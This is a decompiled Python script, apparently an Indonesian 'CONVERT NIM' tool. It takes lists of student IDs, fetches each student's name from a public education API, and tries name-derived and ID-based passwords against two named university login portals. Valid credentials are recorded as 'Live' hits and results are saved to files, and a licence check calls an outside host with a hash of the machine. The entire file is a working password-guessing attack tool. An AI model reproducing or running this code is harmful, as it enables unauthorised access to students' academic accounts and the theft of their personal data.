# uncompyle6 version 3.7.4
# Python bytecode 3.8
# Decompiled from: Python 3.8.5 (default, Jul 24 2020, 12:30:11) 
# [Clang 9.0.8 (https://android.googlesource.com/toolchain/llvm-project 98c855489
# Embedded file name: <EzzKun>
import os, time, json, random, platform, urllib.parse, requests.packages.urllib3
import requests as req, requests.packages.urllib3
from bs4 import BeautifulSoup as bs
requests.packages.urllib3.disable_warnings()
import os, time, platform, hashlib
os.system('clear')
grey = '\x1b[90m'
red = '\x1b[91m'
green = '\x1b[92m'
yellow = '\x1b[93m'
blue = '\x1b[94m'
purple = '\x1b[95m'
cyan = '\x1b[96m'
white = '\x1b[37m'
flag = '\x1b[41;39m'
bold = '\033[1m'
normal = '\033[0m'
off = '\x1b[m'
ok = []
no = []
found = []
error = []
rv = platform.uname().release
me = int(hashlib.sha256(rv.encode('utf-8')).hexdigest(), 16) % 100000000
bn = f"\r{flag}CONVERT NIM{white}|{green} B {cyan}E {yellow}T {white}A{off}\n"

def acd(usr, pwd):
    url = 'http://siap.stmik-sumedang.ac.id/'
    dat = {'nim':usr,  'Pass':pwd, 
     'save':'submit'}
    raw = req.post(url, data=dat, verify=False, timeout=10).text
    sta = bs(raw, 'html.parser').title.get_text()
    if sta == 'Sistem Informasi Akademik Terpadu 4.0':
        print(f"asu{white}{usr}{blue} NIM | NAMA {white}{pwd}")
        ok.append(f"{usr}:{pwd}")
    else:
        print(f"{green}>{white}√{green}< {white}| {yellow}PROSES CONVERT {white}| {white}{usr}{blue} NIM | NAMA {white}{pwd}")
        no.append(f"{usr}:{pwd}")
        with open('hasilconvert.txt', 'a') as (s):
            s.write(f"{usr}:{pwd}\n")
            
def ace(usr, pwd):
    url = 'http://siap.stmik-sumedang.ac.id/'
    dat = {'nim':usr,  'Pass':pwd, 
     'save':'submit'}
    raw = req.post(url, data=dat, verify=False, timeout=10).text
    sta = bs(raw, 'html.parser').title.get_text()
    if sta == 'Sistem Informasi Akademik Terpadu 4.0':
        print(f"asu{white}{usr}{blue} NIM | NAMA {white}{pwd}")
        ok.append(f"{usr}:{pwd}")
    else:
        print(f"{green}>{white}√{green}< {white}| {yellow}PROSES CLONE {white}| {white}{usr}{blue} NIM | NIM {white}{pwd}")
        no.append(f"{usr}:{pwd}")
        with open('hasilclone.txt', 'a') as (s):
            s.write(f"{usr}:{pwd}\n")
            
def upi(i, usr, pwd):
        ses = req.Session()
        url = 'https://login.itb.ac.id/cas/login'
        raw = ses.get(url).text
        tok = bs(raw, 'html.parser').findAll('input')[2]['value']
        dat = {'username':usr,  'password':pwd, 
         'execution':tok, 
         '_eventId':'submit', 
         'submit':'LOGIN'}
        gas = ses.post(url, data=dat).text
        res = bs(gas, 'html.parser').findAll('div')[2]['class'][0]
        if res == 'success':
            print(f" {purple}[{white}{i}{purple}]{green} aktif {white}>{green} {usr}{white}:{green}{pwd}")
            found.append(i)
        else:
            print(f"{green}>{white}{i}{green}< {white}| {yellow}PROSES GENERATE {white}| {white}{usr} {blue}| {off}{pwd}")
            error.append(i)
            with open('hasilgenerate.txt', 'a') as (s):
                s.write(f"{usr}:{pwd}\n")


def done():
    if len(ok) != 0:
        exit(f"\n{purple}[{white}!{purple}]{white}[{green}Live:{len(ok)}{white}]")
       
    else:
        exit(f"\n{purple}[{white}!{purple}]{white}Terkonversi : {cyan}{len(no)}\n{green}[{yellow}✓{green}]{white}Hasil tersimpan di {cyan}hasilconvert.txt{off}")
        
def dina():
    if len(ok) != 0:
        exit(f"\n{purple}[{white}!{purple}]{white}[{green}Live:{len(ok)}{white}]")
       
    else:
        exit(f"\n{purple}[{white}!{purple}]{white}Terkonversi : {cyan}{len(no)}\n{green}[{yellow}✓{green}]{white}Hasil tersimpan di {cyan}hasilclone.txt{off}")
        
def dane():
    if len(found) != 0:
        exit(f"\n{purple}[{white}!{purple}]{white}[{green}Live:{len(found)}{white}]")
       
    else:
        exit(f"\n{purple}[{white}!{purple}]{white}Terkonversi : {cyan}{len(error)}\n{green}[{yellow}✓{green}]{white}Hasil tersimpan di {cyan}hasilgenerate.txt{off}")


def main():
    print(bn)
    print(f"{bold}{cyan}NAMA  DEPAN{normal}")
    print(f"{yellow}————————————————")
    print(f"{red}[{yellow}!{red}]{off} awalan kecil")
    print(f"{yellow}————————————————")
    try:
        akses = req.get(f"http://yutixcode.xyz/akses/ui/{me}", verify=False).status_code
        print(end='')
        if akses != 200:
            print(f"{green}[{white}1{green}]{white}nim:nama")
            print(f"{green}[{white}2{green}]{white}nim:nama123")
            print(f"{green}[{white}3{green}]{white}nim:nama1234")
            print(f"{green}[{white}4{green}]{white}nim:nama12345")
            print(f"{yellow}————————————————")
            print(f"{red}[{yellow}!{red}]{off} awalan besar")
            print(f"{yellow}————————————————")
            print(f"{green}[{white}5{green}]{white}nim:Nama")
            print(f"{green}[{white}6{green}]{white}nim:Nama123")
            print(f"{green}[{white}7{green}]{white}nim:Nama1234")
            print(f"{green}[{white}8{green}]{white}nim:Nama12345")
            print(f"{yellow}————————————————")
            print(f"{bold}{cyan}NAMA  TENGAH{normal}")
            print(f"{red}[{yellow}!{red}]{off} Coming soon")
            print(f"{yellow}————————————————")
            print(f"{bold}{cyan}NAMA  BELAKANG{normal}")
            print(f"{red}[{yellow}!{red}]{off} Coming soon")
            print(f"{yellow}————————————————")
            print(f"{yellow}————————————————")
            print(f"{red}[{yellow}!{red}]{off} Lain-lain")
            print(f"{yellow}————————————————")
            print(f"{green}[{white}@{green}]{white}Menu personal")
            print(f"{green}[{white}96{green}]{white}Full depan")
            print(f"{green}[{white}97{green}]{white}nim:nim")
            print(f"{green}[{white}98{green}]{white}nim:Toxic123")
            print(f"{green}[{white}99{green}]{white}Auto generate nim")
            print(f"{green}[{white}100{green}]{white}Test nama")
            inv = input(f"{flag}{green}[{white}?{green}]{white}Pilih{off} > ")
            if inv == '1':
                    print(f"{yellow}>{red}!!{yellow}<{white}List berisi nim saja")
                    print(f"{white}Input file :")
                    path = input(f"—{cyan}>>> {white}")
                    with open(path, 'r') as (f):
                        lines = f.readlines()
                        count = 1
                        print(f"—{green}>>> {white}Terdeteksi {cyan}{len(lines)} {off}baris")
                        for line in lines:
                            nim = line.strip()
                            raw = req.get(f"https://api-frontend.kemdikbud.go.id/hit_mhs/{nim}", timeout=10).text
                            cek = json.loads(raw)
                            dat = cek['mahasiswa'][0]
                            par = dat['text'].split(',')[0].split('(')[0]
                            ser = par.split(' ')
                            acd(nim, (f"{ser[0].lower()}"))
                            count += 1

                    done()

            elif inv == '2':
                    print(f"{yellow}>{red}!!{yellow}<{white}List berisi nim saja")
                    print(f"{white}Input file :")
                    path = input(f"—{cyan}>>> {white}")
                    with open(path, 'r') as (f):
                        lines = f.readlines()
                        count = 1
                        print(f"—{green}>>> {white}Terdeteksi {cyan}{len(lines)} {off}baris")
                        for line in lines:
                            nim = line.strip()
                            raw = req.get(f"https://api-frontend.kemdikbud.go.id/hit_mhs/{nim}", timeout=10).text
                            cek = json.loads(raw)
                            dat = cek['mahasiswa'][0]
                            par = dat['text'].split(',')[0].split('(')[0]
                            ser = par.split(' ')
                            acd(nim, (f"{ser[0].lower()}123"))
                            count += 1

                    done()
                    
            elif inv  == '3':
                    print(f"{yellow}>{red}!!{yellow}<{white}List berisi nim saja")
                    print(f"{white}Input file :")
                    path = input(f"—{cyan}>>> {white}")
                    with open(path, 'r') as (f):
                        lines = f.readlines()
                        count = 1
                        print(f"—{green}>>> {white}Terdeteksi {cyan}{len(lines)} {off}baris")
                        for line in lines:
                            nim = line.strip()
                            raw = req.get(f"https://api-frontend.kemdikbud.go.id/hit_mhs/{nim}", timeout=10).text
                            cek = json.loads(raw)
                            dat = cek['mahasiswa'][0]
                            par = dat['text'].split(',')[0].split('(')[0]
                            ser = par.split(' ')
                            acd(nim, (f"{ser[0].lower()}1234"))
                            count += 1

                    done()
                    
            elif inv == '4':
                    print(f"{yellow}>{red}!!{yellow}<{white}List berisi nim saja")
                    print(f"{white}Input file :")
                    path = input(f"—{cyan}>>> {white}")
                    with open(path, 'r') as (f):
                        lines = f.readlines()
                        count = 1
                        print(f"—{green}>>> {white}Terdeteksi {cyan}{len(lines)} {off}baris")
                        for line in lines:
                            nim = line.strip()
                            raw = req.get(f"https://api-frontend.kemdikbud.go.id/hit_mhs/{nim}", timeout=10).text
                            cek = json.loads(raw)
                            dat = cek['mahasiswa'][0]
                            par = dat['text'].split(',')[0].split('(')[0]
                            ser = par.split(' ')
                            acd(nim, (f"{ser[0].lower()}12345"))
                            count += 1

                    done()
                    
            elif inv == '5':
                    print(f"{yellow}>{red}!!{yellow}<{white}List berisi nim saja")
                    print(f"{white}Input file :")
                    path = input(f"—{cyan}>>> {white}")
                    with open(path, 'r') as (f):
                        lines = f.readlines()
                        count = 1
                        print(f"—{green}>>> {white}Terdeteksi {cyan}{len(lines)} {off}baris")
                        for line in lines:
                            nim = line.strip()
                            raw = req.get(f"https://api-frontend.kemdikbud.go.id/hit_mhs/{nim}", timeout=10).text
                            cek = json.loads(raw)
                            dat = cek['mahasiswa'][0]
                            par = dat['text'].split(',')[0].split('(')[0]
                            ser = par.split(' ')
                            acd(nim, (f"{ser[0].title()}"))
                            count += 1

                    done()
                    
            elif inv == '6':
                    print(f"{yellow}>{red}!!{yellow}<{white}List berisi nim saja")
                    print(f"{white}Input file :")
                    path = input(f"—{cyan}>>> {white}")
                    with open(path, 'r') as (f):
                        lines = f.readlines()
                        count = 1
                        print(f"—{green}>>> {white}Terdeteksi {cyan}{len(lines)} {off}baris")
                        for line in lines:
                            nim = line.strip()
                            raw = req.get(f"https://api-frontend.kemdikbud.go.id/hit_mhs/{nim}", timeout=10).text
                            cek = json.loads(raw)
                            dat = cek['mahasiswa'][0]
                            par = dat['text'].split(',')[0].split('(')[0]
                            ser = par.split(' ')
                            acd(nim, (f"{ser[0].title()}123"))
                            count += 1

                    done()
                    
            elif inv == '7':
                    print(f"{yellow}>{red}!!{yellow}<{white}List berisi nim saja")
                    print(f"{white}Input file :")
                    path = input(f"—{cyan}>>> {white}")
                    with open(path, 'r') as (f):
                        lines = f.readlines()
                        count = 1
                        print(f"—{green}>>> {white}Terdeteksi {cyan}{len(lines)} {off}baris")
                        for line in lines:
                            nim = line.strip()
                            raw = req.get(f"https://api-frontend.kemdikbud.go.id/hit_mhs/{nim}", timeout=10).text
                            cek = json.loads(raw)
                            dat = cek['mahasiswa'][0]
                            par = dat['text'].split(',')[0].split('(')[0]
                            ser = par.split(' ')
                            acd(nim, (f"{ser[0].title()}1234"))
                            count += 1

                    done()
                    
            elif inv == '8':
                    print(f"{yellow}>{red}!!{yellow}<{white}List berisi nim saja")
                    print(f"{white}Input file :")
                    path = input(f"—{cyan}>>> {white}")
                    with open(path, 'r') as (f):
                        lines = f.readlines()
                        count = 1
                        print(f"—{green}>>> {white}Terdeteksi {cyan}{len(lines)} {off}baris")
                        for line in lines:
                            nim = line.strip()
                            raw = req.get(f"https://api-frontend.kemdikbud.go.id/hit_mhs/{nim}", timeout=10).text
                            cek = json.loads(raw)
                            dat = cek['mahasiswa'][0]
                            par = dat['text'].split(',')[0].split('(')[0]
                            ser = par.split(' ')
                            acd(nim, (f"{ser[0].title()}12345"))
                            count += 1

                    done()
                    
            elif inv == '97':
                    print(f"{yellow}>{red}!!{yellow}<{white}List berisi nim saja")
                    print(f"{white}Input file :")
                    path = input(f"—{cyan}>>> {white}")
                    with open(path, 'r') as (f):
                        lines = f.readlines()
                        count = 1
                        print(f"—{green}>>> {white}Terdeteksi {cyan}{len(lines)} {off}baris")
                        for line in lines:
                            nim = line.strip()
                            raw = req.get(f"https://api-frontend.kemdikbud.go.id/hit_mhs/{nim}", timeout=10).text
                            cek = json.loads(raw)
                            dat = cek['mahasiswa'][0]
                            par = dat['text'].split(',')[0].split('(')[0]
                            ser = par.split(' ')
                            ace(nim, nim)
                            count += 1

                    dina()
                    
            elif inv == '98':
                    print(f"{yellow}>{red}!!{yellow}<{white}List berisi nim saja")
                    print(f"{white}Input file :")
                    path = input(f"—{cyan}>>> {white}")
                    with open(path, 'r') as (f):
                        lines = f.readlines()
                        count = 1
                        print(f"—{green}>>> {white}Terdeteksi {cyan}{len(lines)} {off}baris")
                        for line in lines:
                            nim = line.strip()
                            raw = req.get(f"https://api-frontend.kemdikbud.go.id/hit_mhs/{nim}", timeout=10).text
                            cek = json.loads(raw)
                            dat = cek['mahasiswa'][0]
                            par = dat['text'].split(',')[0].split('(')[0]
                            ser = par.split(' ')
                            acd(nim, f"Kontol123")
                            count += 1
                            acd(nim, f"Memek123")
                            count += 1
                            acd(nim, f"Anjing123")
                            count += 1
                            acd(nim, f"Bangsat123")
                            count += 1
                            acd(nim, f"Jembut123")
                            count += 1

                    done()
                    
            elif inv == '99':
                        print(f"{green}>>>{white} Masukan patokan nim")
                        uid = int(input(f"{yellow}>>>{white} : "))
                        max = int(input(f"{cyan}>>>{white} Jumlah generate > "))
                        for i in range(max):
                            upi(i + 1, uid, uid)
                            uid += 1
                        else:
                            dane()
                            
            elif inv == '96':
                    print(f"{yellow}>{red}!!{yellow}<{white}List berisi nim saja")
                    print(f"{white}Input file :")
                    path = input(f"—{cyan}>>> {white}")
                    with open(path, 'r') as (f):
                        lines = f.readlines()
                        count = 1
                        print(f"—{green}>>> {white}Terdeteksi {cyan}{len(lines)} {off}baris")
                        for line in lines:
                            nim = line.strip()
                            raw = req.get(f"https://api-frontend.kemdikbud.go.id/hit_mhs/{nim}", timeout=10).text
                            cek = json.loads(raw)
                            dat = cek['mahasiswa'][0]
                            par = dat['text'].split(',')[0].split('(')[0]
                            ser = par.split(' ')
                            acd(nim, nim)
                            count += 1
                            acd(nim, (f"{ser[0].lower()}"))
                            count += 1
                            acd(nim, (f"{ser[0].title()}"))
                            count += 1
                            acd(nim, (f"{ser[0].title()}123"))
                            count += 1
                            acd(nim, (f"{ser[0].title()}1234"))
                            count += 1
                            acd(nim, (f"{ser[0].title()}12345"))
                            count += 1
                            acd(nim, (f"{ser[0].lower()}123"))
                            count += 1
                            acd(nim, (f"{ser[0].lower()}1234"))
                            count += 1
                            acd(nim, (f"{ser[0].lower()}12345"))
                            count += 1

                    done()
                    
            elif inv == '100':
                    print(f"{yellow}>{red}!!{yellow}<{white}List berisi nim saja")
                    print(f"{white}Input file :")
                    path = input(f"—{cyan}>>> {white}")
                    with open(path, 'r') as (f):
                        lines = f.readlines()
                        count = 1
                        print(f"—{green}>>> {white}Terdeteksi {cyan}{len(lines)} {off}baris")
                        for line in lines:
                            nim = line.strip()
                            raw = req.get(f"https://api-frontend.kemdikbud.go.id/hit_mhs/{nim}", timeout=10).text
                            cek = json.loads(raw)
                            dat = cek['mahasiswa'][0]
                            par = dat['text'].split(',')[0].split('(')[0]
                            ser = par.split(' ')
                            acd(nim, ser)
                            count += 1

                    done()
                    
            elif inv == '@':
               print(f"{green}[{red}1{green}]{white}Menu personal")
               print(f"{green}[{white}2{green}]{white}Kembali")
               select = input(f"{green}>>>{white} Pilih : ")
               if select == '1':
                             print(f"{yellow}>{red}!!{yellow}<{white}List berisi nim saja")
                             print(f"{white}Input file :")
                             path = input(f"—{cyan}>>> {white}")
                             with open(path, 'r') as (f):
                                 lines = f.readlines()
                                 count = 1
                                 print(f"—{green}>>> {white}Terdeteksi {cyan}{len(lines)} {off}baris")
                                 for line in lines:
                                     nim = line.strip()
                                     raw = req.get(f"https://api-frontend.kemdikbud.go.id/hit_mhs/{nim}", timeout=10).text
                                     cek = json.loads(raw)
                                     dat = cek['mahasiswa'][0]
                                     par = dat['text'].split(',')[0].split('(')[0]
                                     ser = par.split(' ')
                                     acd(nim, (f"{ser[0].title()}123"))
                                     count += 1
                                     acd(nim, (f"{ser[0].title()}1234"))
                                     count += 1
                                     acd(nim, (f"{ser[0].title()}12345"))
                                     count += 1

                             done()
               elif select == '2':
               	os.system('clear')
               	main()
                    	

            else:
                exit(f"\n{purple}[{white}!{purple}]{white}Yang bener masukin inputnya")
        else:
            print(end=f"\r{white} {{!}} Kamu tidak memiliki izin\n {{!}} YourID: {green}{me}\n")
            exit(f"{white} {{!}} Author: {green}YutixCode")
    except KeyboardInterrupt:
        exit(f"\n{purple}[{white}!{purple}]{white}Keluar script")
    except Exception as er:
        try:
            exit(f"\n{white} {{!}} {er}")
        finally:
            er = None
            del er


if __name__ == '__main__':
    main()